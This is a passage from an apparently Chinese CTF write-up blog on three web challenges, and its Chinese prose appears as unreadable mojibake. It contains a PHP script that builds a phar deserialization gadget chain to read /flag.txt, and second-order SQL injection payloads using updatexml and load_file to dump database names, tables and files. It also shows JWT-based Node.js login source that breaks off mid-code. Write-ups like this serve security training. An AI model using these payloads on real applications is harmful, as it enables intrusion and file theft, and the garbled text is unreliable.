class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åº”è¯¥æ˜¯ååºåˆ—åŒ–äº†ï¼Œæç¤ºäº†pharåè®®ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹</p><h4 id="pharç®€ä»‹"><a href="#pharç®€ä»‹" class="headerlink" title="pharç®€ä»‹"></a>pharç®€ä»‹</h4><p>pharï¼Œå…¨ç§°ä¸ºPHP Archiveï¼Œpharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚å¯ä»¥å°†pharæ–‡ä»¶ç±»æ¯”ä¸ºä¸€ä¸ªå‹ç¼©æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">pharæ–‡ä»¶ç»“æ„1. a stubå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚2. a manifest describing the contentspharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚3. the file contentsè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚4. [optional] a signature for verifying Phar integrity (phar file format only)ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆæ‰¾ååºåˆ—åŒ–é“¾å­å§</p><blockquote><p>ä¼šå‘ç°åœ¨Fileç±»ä¸­æœ‰ä¸€ä¸ªclose()å‡½æ•°ï¼Œè¿™é‡Œè¿˜ç›´æ¥è°ƒç”¨file_get_comtents()å‡½æ•°,é‚£ä¹ˆä¸å¤šè¯´è¿™é‡Œç»å¯¹æ˜¯é“¾å­çš„ç»“å°¾ã€‚ä½†æ˜¯å¦‚æœåªç”¨è¿™ä¸¤ä¸ªç±»æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºä¸èƒ½ç›´æ¥æ‰“å°å‡ºæ¥ã€‚æ‰€ä»¥å¾—ç»§ç»­ä¸‹ä¸€ä¸ªç±»FileListç»§ç»­ä½¿ç”¨ï¼Œæ­£å¥½é‡Œé¢ä¹Ÿæœ‰__callå‡½æ•°ã€‚funcæ˜¯è°ƒç”¨çš„æ–¹æ³•åï¼Œargsæ˜¯æ–¹æ³•çš„å‚æ•°<br>â€ƒ<br>é‚£ä¹ˆæˆ‘ä»¬å°±å°†$this-&gt;dbå¤åˆ¶ä¸ºFileListç±»è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥ç±»ä¸­å¾—æ–¹æ³•ã€‚</p></blockquote><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;exp.php&lt;?phpclass User&#123;    public $db;    public function __construct()     &#123;        $this-&gt;db &#x3D; new FileList();    &#125;&#125;class File&#123;    public $filename;&#125;class FileList &#123;    private $files;    public function __construct()     &#123;        $file &#x3D; new File();        $file-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;        $this-&gt;files &#x3D; array($file);    &#125;&#125;$User &#x3D; new User();$phar &#x3D; new Phar(&quot;.&#x2F;rabbit.phar&quot;); &#x2F;&#x2F;.pharæ–‡ä»¶$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$phar-&gt;setMetadata($User); &#x2F;&#x2F;è§¦å‘çš„å¤´æ˜¯Userç±»ï¼Œæ‰€ä»¥ä¼ å…¥Userå¯¹è±¡$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;ç”Ÿæˆç­¾å$phar-&gt;stopBuffering();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨deleteé¡µé¢ä¼ å…¥phar://æ–‡ä»¶åå³å¯</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>çœ‹æºç å¾—åˆ°æç¤º<code>&lt;!--?file=?--&gt;</code>ä¼ªåè®®è¯»ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//confirm.phpif(!empty($_POST["user_name"]) &amp;&amp; !empty($_POST["address"]) &amp;&amp; !empty($_POST["phone"]))&#123;    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $address = $_POST["address"];    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = 'no sql inject!';    &#125;else&#123;        $sql = "select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'";        $fetch = $db->query($sql);    &#125;    if($fetch->num_rows>0) &#123;        $msg = $user_name."å·²æäº¤è®¢å•";    &#125;else&#123;        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";        $re = $db->prepare($sql);        $re->bind_param("sss", $user_name, $address, $phone);        $re = $re->execute();//change.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string double-quoted-string">"', `old_address`='"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' where `user_id`="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è®¢å•ä¿®æ”¹æˆåŠŸ"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æœªæ‰¾åˆ°è®¢å•!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¿¡æ¯ä¸å…¨"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³é”®åœ¨äºconfirmä¸­æ²¡æœ‰å¯¹ä¼ å…¥çš„addressè¿›è¡Œè¿‡æ»¤ï¼Œè€Œåœ¨changeä¸­åˆå¯¹æŸ¥è¯¢å‡ºçš„æ—§addressè¿›è¡Œäº†ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ›´æ”¹åœ°å€çš„æ—¶å€™å°±ä¼šè§¦å‘æˆ‘ä»¬åœ¨confirmä¸­æäº¤çš„payload</p><pre class="line-numbers language-none"><code class="language-none">1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŸ¥å®Œåº“å’Œè¡¨å‘ç°å¥½åƒä¸æ˜¯åœ¨æ•°æ®åº“å†…ï¼Œload_fileçœ‹çœ‹æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">1&#39; where phone&#x3D;updatexml(1,concat(0x7e,(select load_file(&#39;&#x2F;flag.txt&#39;)),0x7e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>æ³¨å†Œç™»å½•åç‚¹å‡»<code>GET FLAG</code>æ˜¾ç¤ºæƒé™ä¸è¶³ï¼ŒæŸ¥çœ‹è¿”å›å†…å®¹å‘ç°jwt</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-08">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-08</a> 21.14.12.png)</p><p>ä¸‹ä¸€æ­¥ä¸çŸ¥é“å’‹èµ°äº†ï¼Œçœ‹wpæ˜¯è¦åˆ†ææºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/login"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token literal-property property">authorization</span><span class="token operator">:</span>token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/home"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/register"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> token <span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>            sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/login"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/logout'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè´´ä¸€å¼ jsä»£ç ç»“æ„å›¾</p><p><img src="https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>çœ‹çœ‹controllersä¸­çš„app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//controllers/app.js</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'POST /api/register'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">token</span><span class="token operator">:</span> token        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'POST /api/login'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> 